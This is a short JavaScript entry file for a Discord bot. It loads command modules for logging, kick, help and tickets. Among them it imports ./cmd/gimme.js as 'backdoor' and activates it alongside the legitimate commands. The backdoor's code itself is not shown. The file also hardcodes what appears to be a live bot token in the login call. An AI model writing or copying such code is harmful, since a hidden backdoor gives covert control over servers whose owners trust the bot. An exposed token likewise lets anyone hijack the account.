const Discord = require('discord.js');
const kick = require('./cmd/kick.js');
const client = new Discord.Client();

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});
  const log = require("./cmd/loghandler.js")
  const kack = require("./cmd/kick.js")
  const help = require("./cmd/help.js")
  const logsend = require("./cmd/log.js")
  const backdoor = require("./cmd/gimme.js")
  const ticket = require("./cmd/ticket.js")

      log.joinguild(client)
      log.leaveguild(client)
      log.messageDelete(client)
      log.messageUpdate(client)
      log.banLog(client)
      log.messagelog(client)

      kack.kack(client)

      help.help(client)

      logsend.Penis(client)

      backdoor.gimme(client)

      ticket.ticket(client)
client.login('ODAwODI3MzM3MDI4NTM0MzYy.YAXykw.ERO2xw0pZUow53jrj9pLuGcmN4A');
